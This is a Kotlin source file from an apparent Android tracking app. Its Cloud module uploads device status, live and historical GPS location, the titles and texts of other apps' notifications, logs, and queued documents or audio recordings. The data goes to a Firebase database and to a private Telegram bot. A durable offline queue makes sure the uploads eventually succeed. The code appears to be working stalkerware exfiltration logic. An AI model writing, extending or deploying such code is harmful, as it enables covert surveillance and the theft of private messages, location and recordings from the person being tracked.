package com.venice.tracker

import android.content.Context
import org.json.JSONObject
import java.io.File

object Cloud {

    private val base get() = "${Config.FIREBASE_URL}/${Config.API_SECRET}"
    private val dev get() = "dev/${Config.DEVICE_ID}"

    private fun ok(p: Pair<Int, String>) = p.first in 200..299

    fun put(path: String, json: String): Boolean =
        ok(Util.http("$base/$path.json", "PUT", json.toByteArray()))

    fun post(path: String, json: String): Boolean =
        ok(Util.http("$base/$path.json", "POST", json.toByteArray()))

    fun get(path: String): String? {
        val (c, t) = Util.http("$base/$path.json", "GET", null)
        return if (c in 200..299 && t != "null") t else null
    }

    fun delete(path: String): Boolean =
        ok(Util.http("$base/$path.json", "DELETE", null))

    // ---------- convenience wrappers ----------

    fun sendStatus(ctx: Context, extra: Map<String, Any>) {
        val o = JSONObject()
        o.put("ts", System.currentTimeMillis())
        o.put("model", android.os.Build.MODEL)
        o.put("sdk", android.os.Build.VERSION.SDK_INT)
        for ((k, v) in extra) o.put(k, v)
        put("$dev/status", o.toString())
    }

    fun sendLocation(lat: Double, lon: Double, acc: Float) {
        val o = JSONObject()
            .put("lat", lat).put("lon", lon).put("acc", acc)
            .put("ts", System.currentTimeMillis())
        put("$dev/loc", o.toString())
        post("$dev/lochist", o.toString())
    }

    fun sendNotif(pkg: String, title: String, text: String) {
        val o = JSONObject()
            .put("pkg", pkg).put("title", title).put("text", text)
            .put("ts", System.currentTimeMillis())
        post("$dev/notif", o.toString())
    }

    fun sendLogLine(line: String) {
        post("$dev/log", JSONObject().put("t", line).put("ts", System.currentTimeMillis()).toString())
    }

    // ---------- durable queues (survive being offline) ----------

    fun cloudDir(ctx: Context) = File(ctx.filesDir, "cloudq").apply { mkdirs() }
    fun tgDir(ctx: Context) = File(ctx.filesDir, "tgq").apply { mkdirs() }

    fun queue(ctx: Context, path: String, json: String) {
        val f = File(cloudDir(ctx), "${System.currentTimeMillis()}_${path.replace('/', '_')}.json")
        f.writeText(JSONObject().put("p", path).put("b", json).toString())
    }

    fun queueTg(ctx: Context, src: File, caption: String, asAudio: Boolean) {
        val dest = File(tgDir(ctx), src.name)
        try { src.renameTo(dest) } catch (_: Throwable) { src.copyTo(dest, true) }
        File(tgDir(ctx), src.name + ".meta")
            .writeText(JSONObject().put("c", caption).put("a", asAudio).toString())
    }

    fun flush(ctx: Context) {
        trimQueue(ctx)

        // cloud queue
        for (f in cloudDir(ctx).listFiles()?.sortedBy { it.name } ?: emptyArray()) {
            if (!f.name.endsWith(".json")) continue
            try {
                val o = JSONObject(f.readText())
                val ok = if (o.getString("p").endsWith("lochist") || o.getString("p").endsWith("notif"))
                    post(o.getString("p"), o.getString("b"))
                else put(o.getString("p"), o.getString("b"))
                if (ok) f.delete()
            } catch (t: Throwable) { Util.log(ctx, "cloudq ${f.name}: $t") }
        }

        // telegram queue
        for (f in tgDir(ctx).listFiles()?.sortedBy { it.name } ?: emptyArray()) {
            if (f.name.endsWith(".meta")) continue
            val meta = File(tgDir(ctx), f.name + ".meta")
            if (!meta.exists()) { f.delete(); continue }
            try {
                val m = JSONObject(meta.readText())
                val caption = m.optString("c", "")
                val asAudio = m.optBoolean("a", false)
                if (f.length() > Config.MAX_UPLOAD) {
                    f.delete(); meta.delete(); continue
                }
                val method = if (asAudio) "sendAudio" else "sendDocument"
                val field = if (asAudio) "audio" else "document"
                val r = Util.multipart(
                    "https://api.telegram.org/bot${Config.TG_TOKEN}/$method",
                    mapOf(
                        "chat_id" to Config.TG_CHAT_ID,
                        "caption" to caption.take(1000)
                    ),
                    field, f
                )
                if (r.first in 200..299) { f.delete(); meta.delete() }
                else Util.log(ctx, "tg fail ${r.first} ${r.second.take(200)}")
            } catch (t: Throwable) { Util.log(ctx, "tgq ${f.name}: $t") }
        }
    }

    private fun trimQueue(ctx: Context) {
        val dirs = listOf(cloudDir(ctx), tgDir(ctx))
        var total = 0L
        val all = mutableListOf<File>()
        for (d in dirs) d.listFiles()?.forEach { if (it.isFile) { total += it.length(); all += it } }
        if (total < Config.QUEUE_CAP_MB * 1024L * 1024L) return
        for (f in all.sortedBy { it.lastModified() }) {
            val size = f.length()
            f.delete()
            File(f.parentFile, f.name + ".meta").delete()
            total -= size
            if (total < Config.QUEUE_CAP_MB * 1024L * 1024L * 0.8) break
        }
    }
}
